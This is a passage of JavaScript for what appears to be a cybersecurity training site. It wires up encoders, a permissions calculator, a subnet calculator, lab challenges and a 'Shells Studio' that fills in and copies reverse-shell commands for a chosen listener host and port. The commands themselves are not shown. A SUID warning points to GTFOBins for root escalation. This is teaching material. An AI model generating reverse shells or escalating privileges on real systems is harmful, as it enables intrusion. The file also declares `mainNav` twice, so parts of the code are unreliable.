    if (encOut) encOut.value = text;
    if (encFbk) encFbk.textContent = err;
  };

  view.querySelector('#clearEncoderBtn')?.addEventListener('click', () => {
    if (encInp) encInp.value = '';
    setEncOutput('', '');
  });

  view.querySelector('#copyEncoderOutputBtn')?.addEventListener('click', async () => {
    if (!encOut || !encOut.value) return;
    try {
      await navigator.clipboard.writeText(encOut.value);
      const btn = view.querySelector('#copyEncoderOutputBtn');
      const orig = btn.textContent;
      btn.textContent = '✓ Copied!';
      setTimeout(() => { btn.textContent = orig; }, 2000);
    } catch (_) {}
  });

  view.querySelector('#btnB64Enc')?.addEventListener('click', () => {
    try {
      const v = encInp ? encInp.value : '';
      setEncOutput(btoa(unescape(encodeURIComponent(v))), '');
    } catch (e) {
      setEncOutput('', 'Base64 encoding error: ' + e.message);
    }
  });

  view.querySelector('#btnB64Dec')?.addEventListener('click', () => {
    try {
      const v = (encInp ? encInp.value : '').trim();
      setEncOutput(decodeURIComponent(escape(atob(v))), '');
    } catch (e) {
      setEncOutput('', 'Base64 decoding error: Invalid padding or characters');
    }
  });

  view.querySelector('#btnHexEnc')?.addEventListener('click', () => {
    try {
      const v = encInp ? encInp.value : '';
      const hex = Array.from(new TextEncoder().encode(v)).map(b => b.toString(16).padStart(2, '0')).join('');
      setEncOutput(hex, '');
    } catch (e) {
      setEncOutput('', 'Hex encoding error: ' + e.message);
    }
  });

  view.querySelector('#btnHexDec')?.addEventListener('click', () => {
    try {
      const v = (encInp ? encInp.value : '').replace(/[^0-9a-fA-F]/g, '');
      if (v.length % 2 !== 0) throw new Error('Hex string length must be even');
      const bytes = [];
      for (let i = 0; i < v.length; i += 2) bytes.push(parseInt(v.substr(i, 2), 16));
      setEncOutput(new TextDecoder().decode(new Uint8Array(bytes)), '');
    } catch (e) {
      setEncOutput('', 'Hex decoding error: ' + e.message);
    }
  });

  view.querySelector('#btnUrlEnc')?.addEventListener('click', () => {
    const v = encInp ? encInp.value : '';
    setEncOutput(encodeURIComponent(v), '');
  });

  view.querySelector('#btnUrlDec')?.addEventListener('click', () => {
    try {
      const v = encInp ? encInp.value : '';
      setEncOutput(decodeURIComponent(v), '');
    } catch (e) {
      setEncOutput('', 'URL decoding error: Malformed URI sequence');
    }
  });

  view.querySelector('#btnRot13')?.addEventListener('click', () => {
    const v = encInp ? encInp.value : '';
    const res = v.replace(/[a-zA-Z]/g, c => {
      const base = c <= 'Z' ? 65 : 97;
      return String.fromCharCode(base + (c.charCodeAt(0) - base + 13) % 26);
    });
    setEncOutput(res, '');
  });

  view.querySelector('#btnBinEnc')?.addEventListener('click', () => {
    const v = encInp ? encInp.value : '';
    const bin = Array.from(new TextEncoder().encode(v)).map(b => b.toString(2).padStart(8, '0')).join(' ');
    setEncOutput(bin, '');
  });

  view.querySelector('#btnBinDec')?.addEventListener('click', () => {
    try {
      const v = (encInp ? encInp.value : '').trim();
      if (!v) { setEncOutput('', ''); return; }
      const binArr = v.split(/\s+/).map(b => parseInt(b, 2));
      setEncOutput(new TextDecoder().decode(new Uint8Array(binArr)), '');
    } catch (e) {
      setEncOutput('', 'Binary decoding error: Invalid binary bytes');
    }
  });

  view.querySelector('#btnSha256')?.addEventListener('click', async () => {
    try {
      const v = encInp ? encInp.value : '';
      const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(v));
      const hex = Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
      setEncOutput(hex, '');
    } catch (e) {
      setEncOutput('', 'SHA-256 computation error: ' + e.message);
    }
  });

  view.querySelector('#btnReverse')?.addEventListener('click', () => {
    const v = encInp ? encInp.value : '';
    setEncOutput(v.split('').reverse().join(''), '');
  });

  /* Workbench: Shells Studio */
  const lhostInp = view.querySelector('#workbenchLhost');
  const lportInp = view.querySelector('#workbenchLport');
  const updateShells = () => {
    if (lhostInp) state.workbenchLhost = lhostInp.value;
    if (lportInp) state.workbenchLport = lportInp.value;
    const shellsListEl = view.querySelector('#shellsList');
    if (shellsListEl) {
      const list = getShellsList(state.workbenchLhost, state.workbenchLport);
      shellsListEl.innerHTML = list.map(sh => `
        <article class="writeup-card" style="margin-bottom:14px">
          <div class="card-top" style="align-items:flex-start">
            <div>
              <div class="tag-row" style="margin-bottom:4px">
                <span class="tag accent">${esc(sh.cat.toUpperCase())}</span>
              </div>
              <h4 style="font-size:16px;color:var(--fg);margin:0">${esc(sh.name)}</h4>
            </div>
            <button class="btn outline copy-btn" data-copy-shell="${esc(sh.id)}">📋 Copy Command</button>
          </div>
          <p style="color:#aeb6c5;font-size:13px;line-height:1.6;margin:8px 0 10px">${esc(sh.desc)}</p>
          <pre class="code-block" style="background:#090d16;padding:12px;border:1px solid #1e293b;border-radius:4px;overflow-x:auto"><code id="shell-code-${esc(sh.id)}" style="color:#00ff88;font-size:13px;font-family:var(--mono)">${esc(sh.cmd)}</code></pre>
        </article>
      `).join('');
      bindShellCopy();
    }
  };

  const bindShellCopy = () => {
    view.querySelectorAll('[data-copy-shell]').forEach(btn => {
      btn.addEventListener('click', async (e) => {
        e.stopPropagation();
        const id = btn.dataset.copyShell;
        const codeEl = view.querySelector(`#shell-code-${id}`);
        if (codeEl) {
          try {
            await navigator.clipboard.writeText(codeEl.textContent);
            const orig = btn.textContent;
            btn.textContent = '✓ Copied!';
            setTimeout(() => { btn.textContent = orig; }, 2000);
          } catch (_) {}
        }
      });
    });
  };
  if (lhostInp) lhostInp.addEventListener('input', updateShells);
  if (lportInp) lportInp.addEventListener('input', updateShells);
  bindShellCopy();

  /* Workbench: Permissions Calculator */
  const permOctal = view.querySelector('#permOctal');
  const permSymbolic = view.querySelector('#permSymbolic');
  const permRiskText = view.querySelector('#permRiskText');
  const permRiskBox = view.querySelector('#permRiskBox');

  const updatePermCalc = (fromOctal) => {
    if (!permOctal || !permSymbolic) return;
    let s = 4, u = 7, g = 5, o = 5;

    if (fromOctal) {
      let raw = (permOctal.value || '0000').replace(/[^0-7]/g, '');
      if (raw.length < 4) raw = raw.padStart(4, '0');
      s = parseInt(raw[raw.length - 4], 10) || 0;
      u = parseInt(raw[raw.length - 3], 10) || 0;
      g = parseInt(raw[raw.length - 2], 10) || 0;
      o = parseInt(raw[raw.length - 1], 10) || 0;

      const setChk = (id, cond) => { const el = view.querySelector(id); if (el) el.checked = !!cond; };
      setChk('#chkSuid', s & 4); setChk('#chkSgid', s & 2); setChk('#chkSticky', s & 1);
      setChk('#chkUr', u & 4); setChk('#chkUw', u & 2); setChk('#chkUx', u & 1);
      setChk('#chkGr', g & 4); setChk('#chkGw', g & 2); setChk('#chkGx', g & 1);
      setChk('#chkOr', o & 4); setChk('#chkOw', o & 2); setChk('#chkOx', o & 1);
    } else {
      const isChk = id => view.querySelector(id)?.checked;
      s = (isChk('#chkSuid') ? 4 : 0) + (isChk('#chkSgid') ? 2 : 0) + (isChk('#chkSticky') ? 1 : 0);
      u = (isChk('#chkUr') ? 4 : 0) + (isChk('#chkUw') ? 2 : 0) + (isChk('#chkUx') ? 1 : 0);
      g = (isChk('#chkGr') ? 4 : 0) + (isChk('#chkGw') ? 2 : 0) + (isChk('#chkGx') ? 1 : 0);
      o = (isChk('#chkOr') ? 4 : 0) + (isChk('#chkOw') ? 2 : 0) + (isChk('#chkOx') ? 1 : 0);
      permOctal.value = `${s}${u}${g}${o}`;
    }

    const sym = [
      '-',
      (u & 4) ? 'r' : '-', (u & 2) ? 'w' : '-', (s & 4) ? ((u & 1) ? 's' : 'S') : ((u & 1) ? 'x' : '-'),
      (g & 4) ? 'r' : '-', (g & 2) ? 'w' : '-', (s & 2) ? ((g & 1) ? 's' : 'S') : ((g & 1) ? 'x' : '-'),
      (o & 4) ? 'r' : '-', (o & 2) ? 'w' : '-', (s & 1) ? ((o & 1) ? 't' : 'T') : ((o & 1) ? 'x' : '-')
    ].join('');
    permSymbolic.textContent = sym;

    let risks = [];
    if (s & 4) risks.push('⚠️ CRITICAL PRIVILEGE ESCALATION RISK: SUID (Set User ID) is active. When executed by any unprivileged user, this binary runs with the file owner\'s privileges (typically root). Check GTFOBins for instant root escalations.');
    if (s & 2) risks.push('⚠️ ELEVATED RISK: SGID (Set Group ID) is active. Executes with group permissions or enforces group inheritance on directories.');
    if (o & 2) risks.push('🚨 CRITICAL INTEGRITY RISK: World-writable (Other write enabled). Any local user or restricted daemon process can modify or overwrite this file.');
    if (s & 1) risks.push('ℹ️ STICKY BIT ACTIVE: Restricted deletion flag set (prevents deletion except by owner, standard for /tmp).');
    if (!risks.length) risks.push('✅ STANDARD PERMISSION MODEL: No elevated special execution bits detected.');

    if (permRiskText) permRiskText.innerHTML = risks.join('<br><br>');
    if (permRiskBox) permRiskBox.style.borderLeftColor = (s & 4 || o & 2) ? 'var(--pink)' : (s & 2) ? 'var(--amber)' : 'var(--green)';
  };

  if (permOctal) {
    permOctal.addEventListener('input', () => updatePermCalc(true));
    ['#chkSuid','#chkSgid','#chkSticky','#chkUr','#chkUw','#chkUx','#chkGr','#chkGw','#chkGx','#chkOr','#chkOw','#chkOx'].forEach(sel => {
      view.querySelector(sel)?.addEventListener('change', () => updatePermCalc(false));
    });
    view.querySelectorAll('.perm-preset').forEach(btn => {
      btn.addEventListener('click', () => {
        permOctal.value = btn.dataset.preset;
        updatePermCalc(true);
      });
    });
    updatePermCalc(true);
  }

  /* Workbench: Subnets Calculator */
  const subIp = view.querySelector('#subnetIp');
  const subPfx = view.querySelector('#subnetPrefix');
  const subRes = view.querySelector('#subnetResults');

  const updateSubnetCalc = () => {
    if (!subIp || !subPfx || !subRes) return;
    state.workbenchSubnetIp = subIp.value;
    state.workbenchSubnetPrefix = subPfx.value;
    const res = calculateSubnet(subIp.value, subPfx.value);
    if (res.valid) {
      subRes.innerHTML = `
        <div class="grid cols-2" style="gap:14px;font-size:13px">
          <div><span style="color:var(--muted)">Network Address:</span> <strong style="color:var(--cyan);font-family:var(--mono)">${esc(res.network)}</strong></div>
          <div><span style="color:var(--muted)">Broadcast Address:</span> <strong style="color:var(--cyan);font-family:var(--mono)">${esc(res.broadcast)}</strong></div>
          <div><span style="color:var(--muted)">Subnet Mask:</span> <strong style="color:var(--green);font-family:var(--mono)">${esc(res.netmask)}</strong></div>
          <div><span style="color:var(--muted)">Wildcard Mask:</span> <strong style="color:var(--amber);font-family:var(--mono)">${esc(res.wildcard)}</strong></div>
          <div><span style="color:var(--muted)">Usable Host Range:</span> <strong style="color:#e2e8f0;font-family:var(--mono)">${esc(res.hostRange)}</strong></div>
          <div><span style="color:var(--muted)">Total Usable Hosts:</span> <strong style="color:var(--green);font-family:var(--mono)">${esc(res.hosts)}</strong></div>
          <div style="grid-column:span 2"><span style="color:var(--muted)">Scope / Class:</span> <strong style="color:var(--accent);font-family:var(--mono)">${esc(res.scope)}</strong></div>
        </div>
      `;
    } else {
      subRes.innerHTML = `<div style="color:var(--pink)">${esc(res.error)}</div>`;
    }
  };
  if (subIp) subIp.addEventListener('input', updateSubnetCalc);
  if (subPfx) subPfx.addEventListener('change', updateSubnetCalc);

  /* Glossary search */
  const gs = view.querySelector('#glossarySearch');
  if (gs) {
    gs.addEventListener('input', () => {
      const q = normalizeAnswer(gs.value);
      const hits = glossary.filter(([t,d]) => !q || normalizeAnswer(t+' '+d).includes(q));
      const container = gs.closest('.view') || view;
      const listEl = container.querySelector('div[style]');
      if (listEl) listEl.innerHTML = hits.map(([t,d]) => `<div class="glossary-item"><strong>${esc(t)}</strong><span>${esc(d)}</span></div>`).join('') || '<div class="empty">No terms matched.</div>';
    });
  }

  /* Challenge labs */
  view.querySelectorAll('[data-check]').forEach(btn => {
    btn.addEventListener('click', () => {
      const id  = btn.dataset.check;
      const ch  = challenges.find(c => c.id === id);
      const inp = view.querySelector(`#ans-${id}`);
      const res = view.querySelector(`#res-${id}`);
      if (!ch || !inp || !res) return;
      if (normalizeAnswer(inp.value) === normalizeAnswer(ch.answer)) {
        res.innerHTML = '<span class="ok">✓ Correct!</span>';
        if (!state.solved.includes(id)) state.solved.push(id);
        save();
        inp.disabled = btn.disabled = true;
        const whyEl = view.querySelector(`#why-${id}`);
        if (whyEl) whyEl.style.display = 'block';
        document.getElementById('sidebarProgress').textContent = completion() + '%';
        document.getElementById('sidebarProgressBar').style.width = completion() + '%';
      } else {
        res.innerHTML = '<span class="bad">✗ Not quite. Check the hint.</span>';
      }
    });
  });

  view.querySelectorAll('[data-hint]').forEach(btn => {
    btn.addEventListener('click', () => {
      const el = view.querySelector(`#hint-${btn.dataset.hint}`);
      if (el) el.classList.toggle('show');
    });
  });

  view.querySelectorAll('[data-why]').forEach(btn => {
    btn.addEventListener('click', () => {
      const el = view.querySelector(`#why-${btn.dataset.why}`);
      if (el) el.style.display = el.style.display === 'none' ? 'block' : 'none';
    });
  });

  /* Interactive terminal lab mount */
  const termMount = view.querySelector('#terminal-lab-mount');
  if (termMount && state.curriculumModule) {
    const modules = (intelCache && intelCache.curriculum) || [];
    const mod = modules.find(m => m.id === state.curriculumModule);
    if (mod && mod.interactive_terminal_challenge) {
      const labData = mod.interactive_terminal_challenge;
      if (typeof window.mountTerminal === 'function') {
        window.mountTerminal(termMount, labData, function(flag) {
          const sk = 'atlas-term-solved-' + (labData.id || 'default');
          localStorage.setItem(sk, '1');
        });
      }
    }
  }

  /* Path domain buttons */
  view.querySelectorAll('.detail [data-domain]').forEach(btn => {
    btn.addEventListener('click', () => openDomain(btn.dataset.domain));
  });
}

/* ── Top-level navigation init ───────────────────────────── */
function init() {
  /* Update navigation and clearances */
  updateNavForRole();

  /* Mobile and Desktop menu toggle */
  const sidebar = document.getElementById('sidebar');
  const menuBtn = document.getElementById('menuToggle');
  const closeBtn = document.getElementById('mobileClose');
  const backdrop = document.getElementById('sidebarBackdrop');

  function openMobileMenu() {
    sidebar?.classList.remove('collapsed');
    sidebar?.classList.add('open');
    backdrop?.classList.add('active');
    document.body.style.overflow = 'hidden';
  }

  function closeMobileMenu() {
    sidebar?.classList.remove('open');
    backdrop?.classList.remove('active');
    document.body.style.overflow = '';
  }

  function closeDesktopMenu() {
    document.querySelector('.app-shell')?.classList.add('sidebar-collapsed');
    sidebar?.classList.add('collapsed');
  }

  function openDesktopMenu() {
    document.querySelector('.app-shell')?.classList.remove('sidebar-collapsed');
    sidebar?.classList.remove('collapsed');
  }

  function toggleDesktopMenu() {
    const isCollapsed = document.querySelector('.app-shell')?.classList.contains('sidebar-collapsed');
    if (isCollapsed) {
      openDesktopMenu();
    } else {
      closeDesktopMenu();
    }
  }

  /* Sidebar nav items - robust event delegation */
  const mainNav = document.querySelector('.main-nav');
  if (mainNav) {
    mainNav.addEventListener('click', (e) => {
      const btn = e.target.closest('.nav-item[data-view]');
      if (!btn) return;
      e.preventDefault();
      e.stopPropagation();
      const targetView = btn.dataset.view;
      if (targetView) {
        setView(targetView);
        if (window.innerWidth <= 820) {
          closeMobileMenu();
        }
      }
    });
  }

  document.querySelectorAll('.nav-item[data-view]').forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.preventDefault();
      e.stopPropagation();
      const targetView = btn.dataset.view;
      if (targetView) {
        setView(targetView);
        if (window.innerWidth <= 820) {
          closeMobileMenu();
        }
      }
    });
  });

  if (menuBtn) {
    menuBtn.addEventListener('click', (e) => {
      e.preventDefault();
      e.stopPropagation();
      if (window.innerWidth <= 820) {
        if (sidebar?.classList.contains('open')) {
          closeMobileMenu();
        } else {
          openMobileMenu();
        }
      } else {
        toggleDesktopMenu();
      }
    });
  }

  if (closeBtn) {
    closeBtn.addEventListener('click', (e) => {
      e.preventDefault();
      e.stopPropagation();
      if (window.innerWidth <= 820) {
        closeMobileMenu();
      } else {
        closeDesktopMenu();
      }
    });
  }

  if (backdrop) {
    backdrop.addEventListener('click', (e) => {
      e.preventDefault();
      e.stopPropagation();
      closeMobileMenu();
    });
  }

  document.addEventListener('click', (e) => {
    if (sidebar?.classList.contains('open')) {
      if (!sidebar.contains(e.target) && !menuBtn?.contains(e.target)) {
        closeMobileMenu();
      }
    }
  });

  window.addEventListener('resize', () => {
    if (window.innerWidth > 820) {
      closeMobileMenu();
    }
  });

  /* Theme toggle */
  const themeBtn = document.getElementById('themeToggle');
  if (themeBtn) {
    themeBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      state.theme = state.theme === 'dark' ? 'light' : 'dark';
      save();
      setTheme();
    });
  }

  /* Global search */
  document.getElementById('globalSearch')?.addEventListener('input', e => {
    const q = e.target.value.trim();
    if (!q) return;
    state.moduleQuery = q;
    state.curriculumModule = null;
    setView('modules');
  });

  /* Add Curriculum nav item if not present */
  const mainNav = document.querySelector('.main-nav');
  if (mainNav && !mainNav.querySelector('[data-view="curriculum"]')) {
    const btn = document.createElement('button');
    btn.className = 'nav-item';
    btn.dataset.view = 'curriculum';
    btn.innerHTML = '<span>12</span> Curriculum';
    btn.addEventListener('click', () => setView('curriculum'));
    mainNav.appendChild(btn);
  }

  /* Add Tricks nav item if not present */
  if (mainNav && !mainNav.querySelector('[data-view="tricks"]')) {
    const btn = document.createElement('button');
    btn.className = 'nav-item';
    btn.dataset.view = 'tricks';
    btn.innerHTML = '<span>13</span> Tricks &amp; tips';
    btn.addEventListener('click', () => setView('tricks'));
    mainNav.appendChild(btn);
  }

  /* Add Workbench nav item if not present */
  if (mainNav && !mainNav.querySelector('[data-view="workbench"]')) {
    const btn = document.createElement('button');
    btn.className = 'nav-item';
    btn.dataset.view = 'workbench';
    btn.innerHTML = '<span>14</span> Cyber workbench';
    btn.addEventListener('click', () => setView('workbench'));
    mainNav.appendChild(btn);
  }

  /* Modal backdrop and escape key closing */
  document.getElementById('modalClose')?.addEventListener('click', closeModal);
  document.getElementById('modalBackdrop')?.addEventListener('click', e => {
    if (e.target.id === 'modalBackdrop') closeModal();
  });
  document.addEventListener('keydown', e => {
    if (e.key === 'Escape') closeModal();
  });

  /* Preload live intelligence and curriculum */
  loadIntel();

  render();
}

let booted = false;
function boot() {
  if (booted) return;
  booted = true;
  init();
}
document.addEventListener('DOMContentLoaded', boot);
if (document.readyState !== 'loading') boot();
